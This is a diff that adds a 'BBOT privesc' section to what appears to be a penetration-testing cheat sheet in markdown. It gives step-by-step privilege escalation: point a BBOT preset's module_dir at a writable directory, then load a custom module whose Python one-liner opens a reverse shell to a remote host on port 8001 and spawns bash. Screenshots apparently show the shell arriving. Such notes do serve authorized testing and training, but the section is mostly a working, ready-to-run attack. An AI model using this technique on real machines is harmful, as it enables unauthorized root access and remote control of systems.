@@ -3621,6 +3621,38 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 
 ------------------------
 
+### BBOT privesc
+
+------------------------
+
+- Create  a bbot_preset.yml and edit the module_dir key to a directory with write access-:
+
+![image](https://github.com/user-attachments/assets/cebb2697-8d33-4b29-b4e0-224079bc1f42)
+
+- Create a malicious module e.g The one below spawn a rev shell-:
+
+```python3
+import os
+from bbot.modules.base import BaseModule
+
+payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
+class dirty(BaseModule):
+     print("I ran your dirty exploit,sensei!!!!")
+     os.system(payload)
+```
+
+- Load your custom preset,the module name is `dirty` based on the class name and the python's file name-:
+
+![image](https://github.com/user-attachments/assets/b8d2dfa7-488b-4766-9f80-9cd6b2f18f8f)
+
+- Revshell popped-:
+
+![image](https://github.com/user-attachments/assets/133fd2a8-4507-46da-ba8b-713a74cce02a)
+
+----------------
+
+
+
 
 
 
